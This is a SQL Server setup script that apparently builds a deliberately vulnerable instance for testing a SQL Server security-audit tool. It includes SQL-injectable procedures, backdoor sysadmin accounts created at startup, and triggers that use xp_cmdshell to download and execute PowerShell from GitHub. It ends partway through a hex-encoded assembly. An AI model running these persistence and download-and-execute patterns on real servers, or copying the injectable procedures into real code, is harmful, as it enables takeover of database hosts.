-- Script: pesterdb.sql
-- Description: This script can be used to configure a new SQL Server 2014 instance for PowerUpSQL Pester tests.
-- https://github.com/NetSPI/PowerUpSQL/blob/master/tests/pesterdb.sql
-- Author: Scott Sutherland, NetSPI

------------------------------------------------------------
-- Create Logins, Database Users, and Grant Assembly Privs
------------------------------------------------------------

-- Create db_ddladmin login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_ddladmin')
CREATE LOGIN [test_login_ddladmin] WITH PASSWORD = 'test_login_ddladmin', CHECK_POLICY = OFF;

-- Create db_ddladmin database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ddladmin')
CREATE USER [test_login_ddladmin] FROM LOGIN [test_login_ddladmin];
GO

-- Add test_login_ddladmin to db_ddladmin role
EXEC sp_addrolemember [db_ddladmin], [test_login_ddladmin];
GO

-- Create login with the CREATE ASSEMBLY database privilege
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_createassembly')
CREATE LOGIN [test_login_createassembly] WITH PASSWORD = 'test_login_createassembly', CHECK_POLICY = OFF;

-- Create test_login_createassembly database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_createassembly')
CREATE USER [test_login_createassembly] FROM LOGIN [test_login_createassembly];
GO

-- Add privilege
GRANT CREATE ASSEMBLY to [test_login_createassembly];
GO

-- Create login with the ALTER ANY ASSEMBLY database privilege
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_alterassembly')
CREATE LOGIN [test_login_alterassembly] WITH PASSWORD = 'test_login_alterassembly', CHECK_POLICY = OFF;

-- Create test_login_alterassembly database user
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_alterassembly')
CREATE USER [test_login_alterassembly] FROM LOGIN [test_login_alterassembly];
GO

-- Add privilege
GRANT ALTER ANY ASSEMBLY to [test_login_alterassembly];
GO
------------------------------------------------------------
-- Create Test SQL Logins
------------------------------------------------------------

-- Select master database
USE master
GO
 
--- Create least privilege server login
If Exists (select loginname from master.dbo.syslogins where name = 'test_login_user')
DROP LOGIN [test_login_user]
GO

If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_user')
CREATE LOGIN [test_login_user] WITH PASSWORD = 'test_login_user', CHECK_POLICY = OFF;
GO

-- Create sysadmin server login
If Exists (select loginname from master.dbo.syslogins where name = 'test_login_admin')
DROP LOGIN [test_login_admin]
GO

If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_admin')
CREATE LOGIN [test_login_admin] WITH PASSWORD = 'test_login_admin', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'test_login_admin', 'sysadmin';
GO

-- Create impersonation login 1
if not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate1')
CREATE LOGIN [test_login_impersonate1] WITH PASSWORD = 'test_login_impersonate1', CHECK_POLICY = OFF;
GO

-- Grant impersonate on sa to test_login_impersonate1
GRANT IMPERSONATE ON LOGIN::sa to [test_login_impersonate1];
GO

-- Create impersonation login 2
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate2')
CREATE LOGIN [test_login_impersonate2] WITH PASSWORD = 'test_login_impersonate2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on test_login_impersonate1 to test_login_impersonate2
GRANT IMPERSONATE ON LOGIN::test_login_impersonate2 to [test_login_impersonate2];
GO

-- Create impersonation login 3
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_impersonate3')
CREATE LOGIN [test_login_impersonate3] WITH PASSWORD = 'test_login_impersonate2', CHECK_POLICY = OFF;
GO

-- Grant impersonate on test_login_impersonate2 to test_login_impersonate3
GRANT IMPERSONATE ON LOGIN::test_login_impersonate1 to [test_login_impersonate3];
GO

-- Create db_owner login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_dbowner')
CREATE LOGIN [test_login_dbowner] WITH PASSWORD = 'test_login_dbowner', CHECK_POLICY = OFF;
GO

-- Create ownership chaining login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_ownerchain')
CREATE LOGIN [test_login_ownerchain] WITH PASSWORD = 'test_login_ownerchain', CHECK_POLICY = OFF;
GO

-- Create server link login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_dblink')
CREATE LOGIN [test_login_dblink] WITH PASSWORD = 'test_login_dblink', CHECK_POLICY = OFF;
GO

-- Create ddladmin login
If not Exists (select loginname from master.dbo.syslogins where name = 'ddladminuser')
CREATE LOGIN [ddladminuser] WITH PASSWORD = 'ddladminuser', CHECK_POLICY = OFF;
GO

-- Create  test_login_credential login
If not Exists (select loginname from master.dbo.syslogins where name = 'test_login_credential')
CREATE LOGIN [test_login_credential] WITH PASSWORD = 'test_login_credential', CHECK_POLICY = OFF;
GO

-- Create credential
If not Exists (select name from sys.credentials where name = 'MyCred1')
CREATE CREDENTIAL MyCred1 WITH IDENTITY = 'winuser',SECRET = 'password';  
GO 

-- Add credential to login
If not Exists (select name from sys.credentials where name = 'MyCred1')
ALTER LOGIN test_login_credential
WITH CREDENTIAL = MyCred1;
GO

-- Create custom server role
If not Exists (select name from sys.server_principals  where name = 'EvilServerRole')
CREATE SERVER ROLE EvilServerRole
GO

-- Add login to role
If not Exists (select name from sys.server_principals  where name = 'EvilServerRole')
EXEC sp_addsrvrolemember 'test_login_user', 'EvilServerRole';
GO


------------------------------------------------------------
-- Create Test Databases
------------------------------------------------------------

-- Create testdb for senstive data tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb')
CREATE DATABASE testdb
GO

-- Create testdb2 for db_owner tests
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb2')
CREATE DATABASE testdb2
GO

-- Create database testdb3
If not Exists (select name from master.dbo.sysdatabases where name = 'testdb3')
CREATE DATABASE testdb3
GO

------------------------------------------------------------
-- Create Test Database Users
------------------------------------------------------------

-- Select testdb2 database
USE testdb2 
GO

-- Set testdb2 as the default db for test_login_dbowner
ALTER LOGIN [test_login_dbowner] with default_database = [testdb2];
GO

-- Create database user for test_login_dbowner login
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_dbowner')
CREATE USER [test_login_dbowner] FROM LOGIN [test_login_dbowner];
GO

-- Add the test_login_dbowner database user to the db_owner role in the testdb2 database
EXEC sp_addrolemember [db_owner], [test_login_dbowner];
GO

-- Set testdb2 as the default db for ddladminuser
ALTER LOGIN [ddladminuser] with default_database = [testdb2];
GO

-- Create database user for ddladminuser login
If not Exists (SELECT name FROM sys.database_principals where name = 'ddladminuser')
CREATE USER [ddladminuser] FROM LOGIN [ddladminuser];
GO

-- Add the ddladminuser database user to the db_ddladmin role in the testdb2 database
EXEC sp_addrolemember [db_ddladmin], [ddladminuser];
GO

-- Select master database
USE master
GO

-- Create database user for user login
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_user')
CREATE USER [test_login_user] FROM LOGIN [test_login_user];
GO

-- Provide the user database user with the CREATE PROCEDURE privilege in the master db
GRANT CREATE PROCEDURE TO [test_login_user]

-- Select testdb3 database
USE testdb3
GO

-- Set default database for test_login_ownerchain
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ownerchain')
ALTER LOGIN [test_login_ownerchain] with default_database = [testdb3];
GO

-- Create database account for test_login_ownerchain
If not Exists (SELECT name FROM sys.database_principals where name = 'test_login_ownerchain')
CREATE USER [test_login_ownerchain] FROM LOGIN [test_login_ownerchain];
GO

-- Select testdb
USE testdb

-- Create custom role
If not Exists (SELECT name FROM sys.database_principals where name = 'EvilRole1')
CREATE ROLE EvilRole1 AUTHORIZATION db_owner;  
GO  

-- Add user to role
If not Exists (SELECT name FROM sys.database_principals where name = 'EvilRole1')
EXEC sp_addrolemember 'EvilRole1','test_login_user';  

------------------------------------------------------------
-- Create Test Tables
------------------------------------------------------------

-- Select testdb databases
USE testdb
GO

-- Create noclist table for ownership chaining test
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)
GO

-- Create tracking table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
 CREATE TABLE [dbo].[tracking](
	[card] [varchar](50) NULL
) ON [PRIMARY]
GO

-- Create secrets table for sensitive data test
If not Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
CREATE TABLE [dbo].[secrets](
	[password] [nchar](200) NULL
) ON [PRIMARY]
GO

-- Select testdb3 databases
USE testdb3
GO

-- Create table1
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
CREATE TABLE dbo.NOCList
(SpyName text NOT NULL,RealName text NULL)

-- Create table2
If not Exists (SELECT name FROM sys.tables WHERE name = 'NOCList2')
CREATE TABLE dbo.NOCList2
(SpyName text NOT NULL,RealName text NULL)


------------------------------------------------------------
-- Create Test Views
------------------------------------------------------------

-- Select testdb3 databases
USE testdb3
GO

-- Create view nocview
IF Object_ID('NOCView') IS NOT NULL
    DROP VIEW NocView
GO
CREATE VIEW NocView 
AS
SELECT * FROM NOCList
GO

-- Grant select privilege to chainuser
if exists (select name from sys.views where name = 'nocview')
GRANT SELECT ON OBJECT::dbo.NocView TO test_login_ownerchain
GO

-- Create view nocview2
IF Object_ID('NOCView2') IS NOT NULL
    DROP VIEW NocView2
GO
CREATE VIEW NocView2 
AS
SELECT * FROM NOCList2
GO


------------------------------------------------------------
-- Create Test Records
------------------------------------------------------------

-- Select testdb database
USE testdb
GO

-- Add sample records to nolist table for ownership chaining test
If Exists (SELECT name FROM sys.tables WHERE name = 'NOCList')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Daniel Craig')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Pierce Bronsan')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Roger Moore')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Timothy Dolton')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','George Lazenby')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Harry Hart',' Colin Firth')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to tracking table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'tracking')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('6011998081409707')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('4012888888881881')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('601199808140asdf')
INSERT INTO [dbo].[tracking] ([card])
VALUES ('40128888888')
GO

-- Select testdb database
USE testdb
GO

-- Add sample records to secrets table for sensitive data test
If Exists (SELECT name FROM sys.tables WHERE name = 'secrets')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password1')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password2')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('password23')
INSERT INTO [dbo].[secrets] ([password])
VALUES ('SueprPassword123!')
GO

-- Select testdb3 databases
USE testdb3
GO

-- Add sample records to table
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('James Bond','Sean Connery')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Ethan Hunt','Tom Cruise')
INSERT dbo.NOCList (SpyName, RealName)
VALUES ('Jason Bourne','Matt Damon')

-- Add sample records to table
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Sydney Bristow','Jennifer Garner')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Evelyn Salt','Angelina Jolie')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Annie Walker','Piper Perabo')
INSERT dbo.NOCList2 (SpyName, RealName)
VALUES ('Perry the Platypus','Dee Bradley Baker')


------------------------------------------------------------
-- Setup Test Server Configurations
------------------------------------------------------------

-- Select master database
USE master

-- Set master as trustworthy
ALTER DATABASE master SET TRUSTWORTHY ON
GO

-- Enable ownership chaining on the testdb
ALTER DATABASE testdb SET DB_CHAINING ON
GO

-- Enable ownership chaining server wide
EXECUTE sp_configure 'show advanced', 1;
RECONFIGURE;
GO

EXECUTE sp_configure 'cross db ownership chaining', 1;
RECONFIGURE;
GO

-- Enable xp_cmdshell
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO
 
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO

-- Select the master database
USE master
GO

-- Create server link
If not Exists (select srvname from master..sysservers where srvname = 'sqlserver1\instance1')
EXEC master.dbo.sp_addlinkedserver 
    	@server = N'sqlserver1\instance1', 
   	@srvproduct=N'SQL Server' ;
GO

-- Add login to link
If Exists (select srvname from master..sysservers where srvname = 'sqlserver1\instance1')
EXEC sp_addlinkedsrvlogin 'sqlserver1\instance1', 'false', NULL, 'linklogin', 'linklogin';
GO


------------------------------------------------------------
-- Create Audit, Server Spec, and Database Spec
------------------------------------------------------------

-- Select master database
USE master
GO
 
-- Create audit
if not exists (select * FROM sys.server_audits where name = 'Audit_Object_Changes')
CREATE SERVER AUDIT Audit_Object_Changes
TO APPLICATION_LOG
WITH (QUEUE_DELAY = 1000, ON_FAILURE = CONTINUE)
ALTER SERVER AUDIT Audit_Object_Changes
WITH (STATE = ON)
GO

-- Create server audit specification
if not exists (select name from sys.server_audit_specifications where name = 'Audit_Server_Level_Object_Changes')
CREATE SERVER AUDIT SPECIFICATION Audit_Server_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (SERVER_OBJECT_CHANGE_GROUP),
ADD (SERVER_OBJECT_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PERMISSION_CHANGE_GROUP),
ADD (SERVER_PRINCIPAL_IMPERSONATION_GROUP)
WITH (STATE = ON)
GO

-- Create the database audit specification
if not exists (select name from sys.database_audit_specifications where name = 'Audit_Database_Level_Object_Changes')
CREATE DATABASE AUDIT SPECIFICATION Audit_Database_Level_Object_Changes
FOR SERVER AUDIT Audit_Object_Changes
ADD (DATABASE_OBJECT_CHANGE_GROUP) 
WITH (STATE = ON)
GO


------------------------------------------------------------
-- Create Test Procedures
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create procedure vulnerable to SQL injection
-- Create view nocview
IF Object_ID('sp_sqli1') IS NOT NULL
    DROP PROC sp_sqli1
GO
CREATE PROCEDURE sp_sqli1
@DbName varchar(max)
WITH EXECUTE AS OWNER
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO
 
-- Allow members of PUBLIC to execute it
if exists (select name from sys.procedures where name = 'sp_sqli1')
GRANT EXECUTE ON sp_sqli1 to PUBLIC
GO

-- Select master database
USE master
GO

-- Create proc to add sysadmin
IF Object_ID('sp_add_backdoor_account') IS NOT NULL
    DROP PROC sp_add_backdoor_account
GO
CREATE PROCEDURE sp_add_backdoor_account
AS
CREATE LOGIN backdoor_account WITH PASSWORD = 'backdoor_account', CHECK_POLICY = OFF;
EXEC sp_addsrvrolemember 'backdoor_account', 'sysadmin';
GO
 
-- Create proc to download and run powershell code
IF Object_ID('sp_add_backdoor') IS NOT NULL
    DROP PROC sp_add_backdoor
GO
CREATE PROCEDURE sp_add_backdoor
AS
-- Download and execute PowerShell code from the internet
EXEC master..xp_cmdshell 'powershell -C "Invoke-Expression (new-object System.Net.WebClient).DownloadString(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1'')"'
GO

-- Configure stored procedures to run at startup
-- Set 'sp_add_backdoor_account' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor_account',
@OptionName = 'startup',
@OptionValue = 'on';
GO
 
-- Setup 'sp_add_backdoor' to auto run
EXEC sp_procoption @ProcName = 'sp_add_backdoor',
@OptionName = 'startup',
@OptionValue = 'on';
GO

-- Select testdb2 database
USE testdb2
GO

-- Create procedure to add test_login_dbowner to the sysadmin fixed server role (should be execute as db_owner)
IF Object_ID('sp_elevate_me') IS NOT NULL
    DROP PROC sp_elevate_me
GO
CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'test_login_dbowner','sysadmin'
GO

-- Create sp_sqli2 procedure
IF Object_ID('sp_sqli2') IS NOT NULL
    DROP PROC sp_sqli2
GO
CREATE PROCEDURE sp_sqli2
@DbName varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT name FROM master..sysdatabases where name like ''%'+ @DbName+'%'' OR name=''tempdb''';
EXECUTE(@query)
END
GO

-- Allow members of PUBLIC to execute it
if exists (select name from sys.procedures where name  = 'sp_sqli2')
GRANT EXECUTE ON sp_sqli2 to PUBLIC
GO

-- Select database testdb3
USE testdb3
GO

-- Create procedure sp_findspy
IF Object_ID('sp_findspy') IS NOT NULL
    DROP PROC sp_findspy
GO
CREATE PROCEDURE sp_findspy
@spy varchar(max)
AS
BEGIN
Declare @query as varchar(max)
SET @query = 'SELECT * FROM NOCView where SpyName like ''%'+ @spy+'%'''; 
EXECUTE(@query)
END
GO

-- Allow the user to execute it
if exists (select name from sys.procedures where name = 'sp_findspy')
GRANT EXECUTE ON sp_findspy to test_login_ownerchain
GO

-- Create procedure 2
IF Object_ID('sp_findspy2') IS NOT NULL
    DROP PROC sp_findspy2
GO
CREATE PROCEDURE sp_findspy2
AS
SELECT * FROM NOCView2 
GO

-- Allow the user to execute it
if exists (select name from sys.procedures where name = 'sp_findspy2')
GRANT EXECUTE ON sp_findspy2 to test_login_ownerchain
GO

-- Create stored procedures that executes OS commands using data from a global temp table

USE tempdb3;
GO
	
CREATE PROCEDURE sp_WhoamiGtt
AS
BEGIN
    -- Create a global temporary table to store the command
    IF OBJECT_ID('tempdb..##GlobalTempTableCommands') IS NULL
    BEGIN
        CREATE TABLE ##GlobalTempTableCommands (
            Command NVARCHAR(4000)
        );
    END;

    -- Insert the command "whoami" into the global temporary table
    INSERT INTO ##GlobalTempTableCommands (Command)
    VALUES ('whoami');

    -- Declare a variable to hold the command
    DECLARE @Command NVARCHAR(4000);

    -- Select the command from the global temporary table
    SELECT TOP 1 @Command = Command FROM ##GlobalTempTableCommands;

    -- Execute the command using xp_cmdshell
    EXEC xp_cmdshell @Command;
END;
GO

------------------------------------------------------------
-- Create Test Triggers
------------------------------------------------------------

-- Select master database
USE master
GO

-- Create the DDL trigger
IF exists (select name from sys.server_triggers where name = 'persistence_ddl_1')
    DROP TRIGGER [persistence_ddl_1] on all server
GO

CREATE Trigger [persistence_ddl_1]
ON ALL Server
FOR DDL_LOGIN_EVENTS
AS
 
-- Download and run a PowerShell script from the internet
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
GO

-- Select testdb database
USE testdb
GO
 
-- Create the DML trigger
IF Object_ID('persistence_dml_1') IS NOT NULL
    DROP trigger persistence_dml_1
GO
CREATE TRIGGER [persistence_dml_1]
ON testdb.dbo.NOCList 
FOR INSERT, UPDATE, DELETE AS
 
-- Download a PowerShell script from the internet to memory and execute it
EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
 
-- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
 
	-- Create a login
	CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'SysAdmin_DML', CHECK_POLICY = OFF;;
	
	-- Add the login to the sysadmin fixed server role
	EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
GO

-- Create a DML trigger	that uses Global Temp tables
	
USE testdb3;
GO

CREATE TRIGGER trigger_dml_gtt
ON NOCList
AFTER INSERT
AS
BEGIN
    -- Create a global temporary table
    CREATE TABLE ##GlobalTempTable (
        Message NVARCHAR(100)
    );

    -- Insert the word "hello" into the global temporary table
    INSERT INTO ##GlobalTempTable (Message)
    VALUES ('hello');

    -- Optionally, you can select from the global temporary table to verify insertion
    SELECT * FROM ##GlobalTempTable;

    -- Drop the global temporary table
    DROP TABLE ##GlobalTempTable;
END;
GO
	
-- Create a DDL trigger	that uses Global Temp tables
	
CREATE TRIGGER [trigger_ddl_gtt]
ON ALL SERVER
FOR DDL_LOGIN_EVENTS
AS
BEGIN
    -- Create a global temporary table to store the URLs if it doesn't already exist
    IF OBJECT_ID('tempdb..##GlobalTempTableUrls') IS NULL
    BEGIN
        CREATE TABLE ##GlobalTempTableUrls (
            Url NVARCHAR(4000)
        );
    END;

    -- Insert the URL into the global temporary table
    INSERT INTO ##GlobalTempTableUrls (Url)
    VALUES ('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1');

    -- Use xp_cmdshell to run a PowerShell command that uses the URL from the global temporary table
    DECLARE @Url NVARCHAR(4000);
    SELECT TOP 1 @Url = Url FROM ##GlobalTempTableUrls;

    DECLARE @Cmd NVARCHAR(4000);
    SET @Cmd = 'Powershell -c "IEX (New-Object Net.WebClient).DownloadString(''' + @Url + ''')"';

    EXEC master..xp_cmdshell @Cmd;

    -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
    IF (SELECT COUNT(name) FROM sys.sql_logins WHERE name LIKE 'SysAdmin_DDL') = 0
    BEGIN
        -- Create a login
        CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'SysAdmin_DDL', CHECK_POLICY = OFF;

        -- Add the login to the sysadmin fixed server role
        EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
    END;
END;
GO

------------------------------------------------------------
-- Create Test Keys, Certificates, and Cert Logins
------------------------------------------------------------

-- Select master database
USE master

-- Create a master key for the database
IF (select count(name)  from sys.symmetric_keys where name like '%DatabaseMasterKey%') = 0
CREATE MASTER KEY ENCRYPTION BY PASSWORD = 'SuperSecretPasswordHere!';
GO

-- Create certificate for the sp_sqli2 procedure
If not Exists (select name from sys.certificates where name = 'sp_sqli2_cert')
CREATE CERTIFICATE sp_sqli2_cert
WITH SUBJECT = 'This should be used to sign the sp_sqli2',
EXPIRY_DATE = '2050-10-20';
GO

-- Create cert login
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
CREATE LOGIN certuser
FROM CERTIFICATE sp_sqli2_cert

-- Add cert to stored procedure
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
ADD SIGNATURE to sp_sqli2
BY CERTIFICATE sp_sqli2_cert;
GO

-- Add the certuser to the sysadmin role
If not Exists (select loginname from master.dbo.syslogins where name = 'certuser')
EXEC sp_addsrvrolemember 'certuser', 'sysadmin';
GO

----------------------------------------------------------------------
-- Setup CLR Assessembly Procedures with hardcoded encryption key
----------------------------------------------------------------------

-- Select the msdb database
use msdb
GO

-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO

-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO

-- Disable clr strict security
-- SQL Server 2017 introduced the ‘clr strict security’ configuration. Microsoft documentation states that the setting needs to be disabled to allow the creation of UNSAFE or EXTERNAL assemblies.
DECLARE @MajorVersion INT;

-- Get the major version number of SQL Server
SELECT @MajorVersion = LEFT(CAST(SERVERPROPERTY('ProductVersion') AS VARCHAR), CHARINDEX('.', CAST(SERVERPROPERTY('ProductVersion') AS VARCHAR)) - 1);

-- Check if the SQL Server version is 2017 or later
IF @MajorVersion >= 14  -- SQL Server 2017 is version 14.x
BEGIN
    -- Disable 'clr strict security' configuration
    EXEC sp_configure 'clr strict security', 0;
    RECONFIGURE;
    GO    
    PRINT 'CLR strict security configuration has been disabled.';
    GO
END
ELSE
BEGIN
    PRINT 'CLR strict security configuration cannot be modified. The SQL Server version is not 2017 or later.';
    GO
END;
	
-- Create assembly
CREATE ASSEMBLY [CommonLib] 
FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103009D50D2590000000000000000E00002210B010B000012000000060000000000000E300000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000B42F00005700000000400000A802000000000000000000000000000000000000006000000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E7465787400000014100000002000000012000000020000000000000000000000000000200000602E72737263000000A8020000004000000004000000140000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001800000000000000000000000000004000004200000000000000000000000000000000F02F000000000000480000000200050010250000A40A000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B300500890000000100001100000F00280400000A168D01000001280500000A720100007028030000060A178D080000010D091672290000701F0C20A00F00006A730600000AA209730700000A0B280800000A076F0900000A000716066F0A00000A00280800000A076F0B00000A00280800000A6F0C00000A0000DE160C007237000070086F0D00000A280E00000A0000DE00002A0000000110000000000100707100160D0000011B300500890000000100001100000F00280400000A168D01000001280500000A720100007028040000060A178D080000010D091672290000701F0C20A00F00006A730600000AA209730700000A0B280800000A076F0900000A000716066F0A00000A00280800000A076F0B00000A00280800000A6F0C00000A0000DE160C007237000070086F0D00000A280E00000A0000DE00002A0000000110000000000100707100160D0000011B30040046010000020000110002280F00000A16FE01130811082D0B724D000070731000000A7A03280F00000A16FE01130811082D0B7261000070731000000A7A140A140B00037E01000004731100000A0C731200000A0B0708076F1300000A1E5B6F1400000A6F1500000A0007186F1600000A0007076F1700000A076F1800000A6F1900000A0D731A00000A1304001104076F1800000A8E69281B00000A161A6F1C00000A001104076F1800000A16076F1800000A8E696F1C00000A0011040917731D00000A1305001105731E00000A1306001106026F1F00000A0000DE14110614FE01130811082D0811066F2000000A00DC0000DE14110514FE01130811082D0811056F2000000A00DC0011046F2100000A282200000A0A00DE14110414FE01130811082D0811046F2000000A00DC0000DE14000714FE01130811082D07076F2300000A0000DC000613072B0011072A0000013400000200C7000DD40014000000000200BD002FEC001400000000020083008E1101140000000002003900F0290114000000001B30040020010000030000110002280F00000A16FE01130911092D0B727B000070731000000A7A03280F00000A16FE01130911092D0B7261000070731000000A7A140A140B00037E01000004731100000A0C02282400000A0D09732500000A130400731200000A0A0608066F1300000A1E5B6F1400000A6F1500000A0006186F1600000A0006110428050000066F2600000A0006066F1700000A066F1800000A6F2700000A13051104110516731D00000A1306001106732800000A130711076F2900000A0BDE14110714FE01130911092D0811076F2000000A00DC0000DE14110614FE01130911092D0811066F2000000A00DC0000DE14110414FE01130911092D0811046F2000000A00DC0000DE14000614FE01130911092D07066F2300000A0000DC000713082B0011082A013400000200B1000ABB0014000000000200A7002CD30014000000000200550096EB00140000000002003900CA03011400000000133004005B00000004000011001A8D200000010A020616068E696F2A00000A068E69FE010D092D0C007291000070732B00000A7A0616282C00000A8D200000010B020716078E696F2A00000A078E69FE010D092D0C0072FB000070732B00000A7A070C2B00082A56282D00000A723D0100706F2E00000A80010000042A1E02282F00000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C00000044030000237E0000B00300004804000023537472696E677300000000F8070000580100002355530050090000100000002347554944000000600900004401000023426C6F620000000000000002000001571502000900000000FA2533001600000100000022000000020000000100000007000000070000002F0000000400000004000000010000000200000000000A00010000000000060032002B000A005A0045000600AE00A40006001601F60006003601F6000A006F01540106008F012B000A009D0154010A00A90139000A00B30154010A00C10154010A00CC015401060016022B0006002C022B0006004C022B0006007F0262020600920262020600A20262020600C10262020600DE02620206000103620206002203A40006002F032B0006004203620206004F03620206006003A40006006D03A400060078032B00060094032B000600D903A4000600E603A4000600FB032B00060005042B000600300424040000000001000000000001000100010010001800000005000100010011007C001000502000000000960064000A000100F82000000000960070000A000200A02100000000960082001400030028230000000096009300140005008824000000009100B5001A0007000525000000008618C30021000800EF240000000091181D040901080000000100C90000000100C90000000100D20000000200DC0000000100E90000000200DC0000000100F4002100C30025002900C30021003100C3002100110085012F003900960133004100C3003A005100C30042005900D40149006100DD014E005100EE0154006100F8014E00610007022100690020022F00710034025A0039003E026B007900C30070008100C30075008900C30021009100B5027C009900CD0280009100D60286009100E9028C009100F20292009100FA029200910012039700B100C3002100B900CD02A00019003C03A600C100C300AE00D100C300B800D9003C037000E10084032100B1008C039200E9009C03BE009100AB032100E900B103D600B100C30086009100C20386009100C9039700F100C300B800F900F1032F0019000004F0000901C3007000B9001504F800110139040D011101CD0213010900C300210020001B002A002E00130022012E000B00190140001B002A006000C400DC00FF00048000000000000000000000000000000000180000000400000000000000000000000100220000000000040000000000000000000000010039000000000000000000003C4D6F64756C653E00636F6D6D6F6E6C69622E646C6C00636F6D6D6F6E6C6962006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E670062656566656E6372797074006265656664656372797074005F73616C7400456E6372797074537472696E674145530044656372797074537472696E674145530053797374656D2E494F0053747265616D0052656164427974654172726179002E63746F72004D79537472696E6700706C61696E5465787400736861726564536563726574006369706865725465787400730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E7469